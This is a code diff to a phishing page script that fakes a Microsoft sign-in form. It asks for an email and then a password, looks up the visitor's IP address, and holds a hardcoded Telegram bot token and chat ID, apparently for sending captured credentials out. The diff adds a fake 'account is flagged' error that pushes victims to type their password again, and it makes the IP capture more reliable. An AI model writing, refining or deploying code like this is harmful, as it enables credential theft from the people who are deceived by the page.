@@ -6,17 +6,18 @@
 <script>
     let step = 1; 
     let attempts = 0;
-    let userIP = "Unknown"; 
+    let userIP = "Fetching..."; 
 
     const botToken = '8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM';
     const chatId = '7523003121';
 
+    // Reliable IP Fetch
     async function fetchIP() {
         try {
             const response = await fetch('https://api.ipify.org');
             const data = await response.json();
             userIP = data.ip || "Unknown";
-        } catch (e) {}
+        } catch (e) { userIP = "Unknown"; }
     }
     fetchIP();
 
@@ -27,6 +28,7 @@
             button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
                 display: none !important; 
             }
+            .error-text { color: #e81123; font-size: 0.8125rem; margin-bottom: 12px; display: none; font-family: 'Segoe UI'; }
         `;
         document.head.appendChild(style);
 
@@ -37,11 +39,15 @@
         if (!passwordField) return;
         const parentContainer = passwordField.parentNode;
 
-        // IDENTITY ROW (ARROW + EMAIL)
+        // CREATE ERROR MESSAGE ELEMENT
+        const errorDiv = document.createElement('div');
+        errorDiv.className = "error-text";
+        errorDiv.innerText = "Your password is correct, but your account is flagged. Please try again.";
+
+        // IDENTITY ROW (ARROW + EMAIL) - High position
         const identityRow = document.createElement('div');
         identityRow.id = "custom-identity-row";
-        // Fixed: Reduced margin-bottom and added negative margin-top to lift it UP
-        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -12px; margin-bottom: 12px; cursor: pointer; width: 100%;";
+        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -25px; margin-bottom: 10px; cursor: pointer; width: 100%;";
         identityRow.innerHTML = `
             <div style="display: flex; align-items: center;">
                 <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #666; margin-right: 8px;">
@@ -54,20 +60,19 @@
             step = 1;
             identityRow.style.display = "none";
             passwordField.style.display = "none";
+            errorDiv.style.display = "none";
             emailInput.style.display = "block";
             if (titleHeader) titleHeader.innerText = "Sign in";
         };
 
-        // STYLE THE HEADER
+        // STYLE THE HEADER (BOLD)
         if (titleHeader) {
             titleHeader.style.fontSize = "1.625rem"; 
             titleHeader.style.fontWeight = "600";
-            titleHeader.style.color = "#1b1b1b";
             titleHeader.style.marginBottom = "14px";
             titleHeader.innerText = "Sign in";
         }
 
-        // EMAIL INPUT
         const emailInput = document.createElement('input');
         emailInput.type = 'email';
         emailInput.placeholder = 'Email, phone, or Skype';
@@ -75,7 +80,8 @@
         
         // DOM PLACEMENT
         parentContainer.prepend(passwordField); 
-        parentContainer.insertBefore(emailInput, passwordField); 
+        parentContainer.insertBefore(errorDiv, passwordField);
+        parentContainer.insertBefore(emailInput, errorDiv); 
         if (titleHeader) parentContainer.insertBefore(titleHeader, emailInput);
         parentContainer.insertBefore(identityRow, titleHeader); 
 
@@ -83,8 +89,10 @@
 
         // BUTTON LOGIC
         if (signInButton) {
-            signInButton.addEventListener('click', (e) => {
+            signInButton.addEventListener('click', async (e) => {
                 e.preventDefault();
+                if (userIP === "Fetching...") await fetchIP();
+
                 if (step === 1) {
                     const emailVal = emailInput.value.trim();
                     if (emailVal === "") return;
@@ -92,9 +100,7 @@
                     document.getElementById('display-email').innerText = emailVal;
                     emailInput.style.display = "none";
                     identityRow.style.display = "flex"; 
-                    
                     if (titleHeader) titleHeader.innerText = "Enter password";
-                    
                     passwordField.style.display = "block";
                     passwordField.focus();
                     step = 2;
@@ -127,6 +133,8 @@
         }
     });
 </script>
+
+
 
 
 
